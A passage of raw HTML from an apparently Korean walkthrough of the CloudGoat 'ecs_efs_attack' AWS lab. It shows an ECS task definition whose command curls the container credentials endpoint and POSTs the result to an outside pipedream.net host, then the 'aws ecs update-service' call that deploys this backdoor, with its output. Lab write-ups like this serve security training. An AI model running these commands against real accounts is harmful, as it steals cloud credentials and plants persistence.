POST -d @data.json {{CALLBACK URL}} \\\" \"</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li>백도어 작업에 필요한 명령인 linka local ddress를 이용한 IMDS 기능으로 credentials 정보를 curl http 요청을 진행해서 정보를 추출할 수 있도록 준비를 합니다</li>\n<li>현재 task 정보의 파라미터로 arn 정보 역시 기입을 한후 백도어를 등록할 준비를 합니다</li>\n</ul>\n<h3 id=\"백도어-페이로드-전달\" style=\"position:relative;\"><a href=\"#%EB%B0%B1%EB%8F%84%EC%96%B4-%ED%8E%98%EC%9D%B4%EB%A1%9C%EB%93%9C-%EC%A0%84%EB%8B%AC\" aria-label=\"백도어 페이로드 전달 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>백도어 페이로드 전달</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLklEQVQoz41S23KCUAyMKCIqdw53FSkW22Kn0774/z+2nQSOLwWnD8tmcjtLEqrbHlV9RRifodIXJNkFSdaOrO0WWfEKLzjAtGIslj6MVTAJCqIaTfuFuvlEnDRSsDRDmFYkYHu1HpgM79FsrikR7aXZx+0OPzxKMSdPQRc9VcgfVlUe3nCoezheNZv8HxC/tndLqKyFH55EIRn+rMo56HEQGzy7SJ2xNANpyIrXGzVyLMwYYpGwztM+nS8N0/yC4/i7O6cQxV5wlK0yXL+C45XY7nOJ27tssN0CO2fwcR7XEb/A6orqCstOQOSAFu7AU+CY4f3FYuTT+Ya2+0ZedohUg6zsZEGsmu9PpcMd5tVV/Jtt+nzLl+4H7/1diixbPeanoefHNsf5Hqcaat8vyPHnkptITFwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/7c0a5552a18f2133913616c4fa5cf8f9/37523/28.png\"\n        srcset=\"/static/7c0a5552a18f2133913616c4fa5cf8f9/e9ff0/28.png 180w,\n/static/7c0a5552a18f2133913616c4fa5cf8f9/f21e7/28.png 360w,\n/static/7c0a5552a18f2133913616c4fa5cf8f9/37523/28.png 720w,\n/static/7c0a5552a18f2133913616c4fa5cf8f9/302a4/28.png 1080w,\n/static/7c0a5552a18f2133913616c4fa5cf8f9/2a08f/28.png 1422w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"taskDefinition\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"taskDefinitionArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:ecs:us-east-1:&lt;USERID>:task-definition/webapp:3\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"containerDefinitions\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"webapp\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"image\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"python:latest\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"cpu\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"memory\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"memoryReservation\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"portMappings\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"containerPort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"hostPort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"protocol\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"tcp\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"essential\"</span><span class=\"token punctuation\">:</span> true<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"entryPoint\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"-c\"</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"command\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token string\">\"/bin/sh -c \\\"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json &amp;&amp; curl -X POST -d @data.json https://ens65n00m5z9al9.m.pipedream.net \\\" \"</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"environment\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"mountPoints\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"volumesFrom\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"family\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"webapp\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"taskRoleArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"executionRoleArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"networkMode\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"awsvpc\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"revision\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"volumes\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ACTIVE\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"requiresAttributes\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"com.amazonaws.ecs.capability.docker-remote-api.1.21\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"com.amazonaws.ecs.capability.task-iam-role\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"com.amazonaws.ecs.capability.docker-remote-api.1.18\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ecs.capability.task-eni\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"placementConstraints\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"compatibilities\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token string\">\"EC2\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FARGATE\"</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"requiresCompatibilities\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token string\">\"FARGATE\"</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"cpu\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"256\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"memory\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"512\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"registeredAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:44:41.447000+00:00\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"registeredBy\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:sts::&lt;USERID>:assumed-role/cg-ec2-role-ecs_efs_attack_cgidzng5qpdu9q/i-0a14dcbb45885cb69\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>백도어 파일을 등록하였고 이에 대한 업데이트를 할 수 있도록 task definition을 사용하여 container 배포를 자동으로 시도합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7ElEQVQY021Q7W7CMAwMBcYooS0tpR8hhBTWFUoAIU3axPs/10321K3S+uN09tln2RbaNkiLCrmqofQZ2rQotw2UPiEvawZplBfq/ZepZ7e/wFSO46x4w9a0EPZwx7F+cJEKNMAebmyM13tEsUEU75CkFml2hC9zvPobzOYbjomFWP6Bhrnbk81iFMCbrDAaR4zxNOacePKSMLpaH9TTQTTnD7j7E8Y6JGmF+SKDDErIUMGXBWSgeCPhhf/MHfq6CFcarftEe/3ik2ib6WzNoI2ISeubhgZ3mqAN6On01MWy/BG94bOGTuwPI/4GMGKQko/G6PgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/41ca71bf8da47bf5e4b56b6abcec300c/37523/29.png\"\n        srcset=\"/static/41ca71bf8da47bf5e4b56b6abcec300c/e9ff0/29.png 180w,\n/static/41ca71bf8da47bf5e4b56b6abcec300c/f21e7/29.png 360w,\n/static/41ca71bf8da47bf5e4b56b6abcec300c/37523/29.png 720w,\n/static/41ca71bf8da47bf5e4b56b6abcec300c/302a4/29.png 1080w,\n/static/41ca71bf8da47bf5e4b56b6abcec300c/07a9c/29.png 1440w,\n/static/41ca71bf8da47bf5e4b56b6abcec300c/c8ad9/29.png 1564w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">ubuntu@ip<span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token operator\">-</span><span class=\"token number\">133</span><span class=\"token punctuation\">:</span><span class=\"token operator\">~</span>$ aws ecs update<span class=\"token operator\">-</span>service <span class=\"token operator\">-</span><span class=\"token operator\">-</span>service arn<span class=\"token punctuation\">:</span>aws<span class=\"token punctuation\">:</span>ecs<span class=\"token punctuation\">:</span>us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span><span class=\"token punctuation\">:</span>service<span class=\"token operator\">/</span>cg<span class=\"token operator\">-</span>cluster<span class=\"token operator\">-</span>ecs_efs_attack_cgidzng5qpdu9q<span class=\"token operator\">/</span>cg<span class=\"token operator\">-</span>webapp<span class=\"token operator\">-</span>ecs_efs_attack_cgidzng5qpdu9q <span class=\"token operator\">-</span><span class=\"token operator\">-</span>cluster arn<span class=\"token punctuation\">:</span>aws<span class=\"token punctuation\">:</span>ecs<span class=\"token punctuation\">:</span>us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span><span class=\"token punctuation\">:</span>cluster<span class=\"token operator\">/</span>cg<span class=\"token operator\">-</span>cluster<span class=\"token operator\">-</span>ecs_efs_attack_cgidzng5qpdu9q <span class=\"token operator\">-</span><span class=\"token operator\">-</span>task<span class=\"token operator\">-</span>definition arn<span class=\"token punctuation\">:</span>aws<span class=\"token punctuation\">:</span>ecs<span class=\"token punctuation\">:</span>us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span><span class=\"token punctuation\">:</span>task<span class=\"token operator\">-</span>definition<span class=\"token operator\">/</span>webapp<span class=\"token punctuation\">:</span><span class=\"token number\">3</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"service\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"serviceArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:ecs:us-east-1:&lt;USERID>:service/cg-cluster-ecs_efs_attack_cgidzng5qpdu9q/cg-webapp-ecs_efs_attack_cgidzng5qpdu9q\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"serviceName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-webapp-ecs_efs_attack_cgidzng5qpdu9q\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"clusterArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:ecs:us-east-1:&lt;USERID>:cluster/cg-cluster-ecs_efs_attack_cgidzng5qpdu9q\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"loadBalancers\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"serviceRegistries\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ACTIVE\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"desiredCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"runningCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"pendingCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"launchType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"FARGATE\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"platformVersion\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"LATEST\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"taskDefinition\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:ecs:us-east-1:&lt;USERID>:task-definition/webapp:3\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"deploymentConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"deploymentCircuitBreaker\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"enable\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"rollback\"</span><span class=\"token punctuation\">:</span> false\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"maximumPercent\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"minimumHealthyPercent\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"deployments\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ecs-svc/9719804482648596889\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"PRIMARY\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"taskDefinition\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:ecs:us-east-1:&lt;USERID>:task-definition/webapp:3\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"desiredCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"pendingCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"runningCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"failedTasks\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:47:06.407000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"updatedAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:47:06.407000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"launchType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"FARGATE\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"platformVersion\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1.4.0\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"networkConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"awsvpcConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                            <span class=\"token string\">\"subnet-00a761bd4a95363c0\"</span>\n                        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"securityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                            <span class=\"token string\">\"sg-05636ec76dbc40c42\"</span>\n                        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"assignPublicIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ENABLED\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"rolloutState\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"IN_PROGRESS\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"rolloutStateReason\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ECS deployment ecs-svc/9719804482648596889 in progress.\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ecs-svc/4820190458051897207\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ACTIVE\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"taskDefinition\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:ecs:us-east-1:&lt;USERID>:task-definition/webapp:2\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"desiredCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"pendingCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"runningCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"failedTasks\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:27:10.816000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"updatedAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:46:27.459000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"launchType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"FARGATE\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"platformVersion\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1.4.0\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"networkConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"awsvpcConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                            <span class=\"token string\">\"subnet-00a761bd4a95363c0\"</span>\n                        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"securityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                            <span class=\"token string\">\"sg-05636ec76dbc40c42\"</span>\n                        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"assignPublicIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ENABLED\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"rolloutState\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"IN_PROGRESS\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"rolloutStateReason\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ECS deployment ecs-svc/4820190458051897207 in progress.\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ecs-svc/4824857400021118616\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ACTIVE\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"taskDefinition\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:ecs:us-east-1:&lt;USERID>:task-definition/webapp:1\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"desiredCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"pendingCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"runningCount\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"failedTasks\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T04:13:26.010000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"updatedAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:27:15.322000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"launchType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"FARGATE\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"platformVersion\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1.4.0\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"networkConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"awsvpcConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                            <span class=\"token string\">\"subnet-00a761bd4a95363c0\"</span>\n                        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"securityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                            <span class=\"token string\">\"sg-05636ec76dbc40c42\"</span>\n                        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"assignPublicIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ENABLED\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"rolloutState\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"COMPLETED\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"rolloutStateReason\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ECS deployment ecs-svc/4824857400021118616 completed.\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"roleArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/aws-service-role/ecs.amazonaws.com/AWSServiceRoleForECS\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"events\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ea4ed3a7-b03d-4c6e-9133-6d076dcefe1d\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:46:27.714000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 32d3bb5d6566426296527e16e5a4ccc9).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token 